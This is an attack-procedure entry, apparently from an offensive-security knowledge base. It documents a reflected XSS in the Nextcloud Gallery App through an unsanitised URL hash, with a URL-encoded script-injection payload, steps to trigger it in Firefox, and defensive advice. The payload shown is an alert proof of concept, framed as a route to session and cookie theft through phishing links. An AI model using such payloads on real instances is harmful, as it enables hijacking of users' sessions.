---
tags:
  - xss
  - nextcloud
  - javascript
type: procedure
tools:
  - '[[tools/Firefox]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:25.258Z'
sub_techniques: []
id: c14d24d0-9a51-40e5-a9ae-27afa5a6e437
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger-Reflected-XSS-in-Nextcloud-Gallery-App

## Summary

This procedure exploits a reflected Cross-Site Scripting (XSS) vulnerability in the Nextcloud Gallery App by injecting malicious JavaScript into the URL hash fragment, which is not sanitized, leading to immediate execution in the victim's browser and potential theft of sensitive data like session tokens.

## Description

The Nextcloud Gallery App processes the URL hash fragment without proper sanitization or validation, allowing attackers to inject arbitrary JavaScript code. By crafting a URL with a payload in the hash (e.g., a script tag), an attacker can trick a victim into navigating to it, resulting in code execution within the app's context. This is particularly dangerous in authenticated sessions, enabling session hijacking, cookie theft, or keylogging. The vulnerability was reported in Nextcloud and affects versions prior to patches, discovered via browser testing.

## Requirements

1. Access to a vulnerable Nextcloud instance with the Gallery App enabled
2. Knowledge of the base URL (e.g., https://target.com/index.php/apps/gallery/)
3. A web browser like Firefox to load and test the payload
4. Victim interaction (e.g., via phishing link) for real-world exploitation

## Defense

Defensive measures and detection strategies:

- Sanitize and encode all URL hash fragments on the client-side before processing
- Implement Content Security Policy (CSP) to restrict inline script execution
- Monitor for unusual JavaScript alerts or network requests from the Gallery App
- Educate users on avoiding suspicious links in collaborative environments

## Objectives

1. Execute arbitrary JavaScript in the browser context of the Nextcloud Gallery App
2. Demonstrate potential for data exfiltration, such as stealing session cookies
3. Highlight the need for hash fragment validation in single-page applications

## Instructions

### Step 1: Craft the Malicious URL

**Context**: Construct a URL that embeds the XSS payload in the hash fragment to bypass sanitization and inject a script tag.

No command required; manually build the URL:

```url
https://target-nextcloud.com/index.php/apps/gallery/#%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3Ejavascript:alert%280%29%3C/script%3E//%00
```

> This URL uses URL encoding to hide the payload: #%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3Ejavascript:alert%280%29//%00. Upon decoding, it becomes #><script>alert(document.domain)</script>javascript:alert(0)//\u0000, closing any open tags and injecting the alert script.

### Step 2: Load the URL in Browser

**Context**: Navigate to the crafted URL using a web browser to trigger the payload execution.

Use [[tools/Firefox]] to open the URL:

1. Launch Firefox.
2. Enter the malicious URL in the address bar and press Enter.

> Expected output: The Gallery App loads, but an alert dialog immediately appears showing the document domain (e.g., "target-nextcloud.com"), confirming successful XSS execution. Inspect the browser console for the injected script if needed.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Firefox]]

## Tags

- [[xss]]
- [[nextcloud]]
- [[JavaScript]]
